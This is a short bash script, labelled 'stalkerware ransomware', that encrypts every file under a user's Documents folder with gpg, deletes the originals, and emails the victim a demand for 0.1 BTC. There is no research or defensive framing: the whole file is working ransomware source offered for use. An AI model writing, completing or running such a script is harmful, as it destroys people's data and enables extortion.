#!/bin/bash

# Path to files that should be encrypted
ENCRYPT_PATH="/home/user/Documents"

# Encrypt the files using the 'gpg' command with a public key.
function encrypt_files() {
    for file in $(find $ENCRYPT_PATH -type f); do
        gpg --recipient "STALKER" --output "${file}.enc" --encrypt "$file"
        rm "$file"
    done
}

# Send an email to the victim requesting ransom
function send_email() {
    echo "Your files have been encrypted. Pay 0.1 BTC to get your data back at bitcoin:1A1zP1eP5QGefi2DMPTfTL5SLmv7hLqSm9" | mail -s "Important message" victim@example.com
}

# Main function
function main() {
    echo "Starting stalkerware ransomware..."

    # Encrypt files
    encrypt_files

    # Send email
    send_email
    
    echo "Stalkerware ransomware completed. Files are encrypted and you'll receive an email with further instructions."
}

main
